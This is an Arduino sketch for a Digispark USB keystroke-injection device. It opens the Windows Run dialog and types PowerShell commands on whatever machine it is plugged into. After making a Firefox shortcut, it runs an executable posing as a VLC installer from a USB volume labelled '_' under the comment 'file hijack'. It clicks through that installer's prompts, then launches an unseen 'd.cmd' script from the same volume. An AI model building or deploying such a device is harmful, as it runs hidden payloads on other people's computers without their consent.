#include "DigiKeyboard.h"
#define KEY_UP_ARROW     0x52
#define KEY_DOWN_ARROW   0x51
#define KEY_LEFT_ARROW   0x50
#define KEY_RIGHT_ARROW  0x4F
#define KEY_LEFT_GUI     0xE3
#define KEY_ESC          0x29
#define KEY_HOME         0x4A
#define KEY_INSERT       0x49
#define KEY_NUM_LOCK     0x53
#define KEY_SCROLL_LOCK  0x47
#define KEY_CAPS_LOCK  0x39
#define KEY_TAB          0x2B

void digiBegin() {
  DigiKeyboard.sendKeyStroke(0,0);
  DigiKeyboard.delay(1500);
}

void digiEnd() {
  const int led=1;
  pinMode(led, OUTPUT);
  while (1) {
    digitalWrite(led, !digitalRead(led));
    DigiKeyboard.delay(500);
  }
}

void printText(fstr_t *txt) {
  DigiKeyboard.print(txt);
  DigiKeyboard.update(); // update regularly according to digikeyboard wiki
}

void setup() {
  digiBegin();
//  ---------------begain shortcut firefox---------
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  printText(F(" powershell \"$Shell = New-Object -ComObject ('WScript.Shell');$St = $Shell.CreateShortcut($env:USERPROFILE + '\\\\Desktop\\\\Firefox.lnk'); $St.TargetPath='C:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe' ; $St.Arguments='https://google.com/' ; $St.Save()\""));
//  printText(F("powershell"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
//  DigiKeyboard.delay(500);
//  printText(F("$Shell = New-Object -ComObject ('WScript.Shell');$St = $Shell.CreateShortcut($env:USERPROFILE + '\\Desktop\\Firefox.lnk'); $St.TargetPath='C:\\Program Files\\Mozilla Firefox\\firefox.exe' ; $St.Arguments='https://google.com/' ; $St.Save() ; exit"));
//  DigiKeyboard.sendKeyStroke(KEY_ENTER);

//---------------begain file hijack---------
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  printText(F("powershell \".((gwmi win32_volume -f 'label=''_''').Name+'vlc-3.0.1-win64.exe')\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_TAB , MOD_SHIFT_LEFT);
//  DigiKeyboard.delay(10);
//  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
//  DigiKeyboard.sendKeyPress(0,0); //
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(20000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  //---------------begain install vlc---------
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  printText(F("powershell \".((gwmi win32_volume -f 'label=''_''').Name+'d.cmd')\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digiEnd();
  
}

void loop() {
  // put your main code here, to run repeatedly:

}
